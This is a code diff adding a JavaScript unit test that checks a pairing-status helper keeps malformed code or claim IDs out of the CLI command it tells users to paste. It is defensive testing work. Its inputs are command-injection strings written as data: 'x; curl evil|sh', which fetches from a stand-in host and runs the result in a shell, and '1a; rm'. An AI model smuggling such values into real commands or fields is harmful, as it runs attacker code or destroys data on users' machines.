@@ -86,3 +86,10 @@ test("each stuck state names the command to run, and the details say where it st
   assert.equal(S.view({ status: "unpaired", reason: "bridge_signed_out" }).command, "monoagentcli account login");
   assert.match(S.view({ status: "unpaired", reason: "pair_waiting" }).debug, /status: unpaired \/ pair_waiting/);
 });
+
+test("a code or id that is not a plain token never reaches the pasted command", () => {
+  const v = S.view({ status: "unpaired", reason: "pair_waiting", code: "x; curl evil|sh", claimId: "1a2b3c4d5e6f" });
+  assert.doesNotMatch(v.command, /curl/);
+  const w = S.view({ status: "unpaired", reason: "pair_waiting", code: "Q9R-KWK", claimId: "1a; rm" });
+  assert.doesNotMatch(w.command, /rm/);
+});
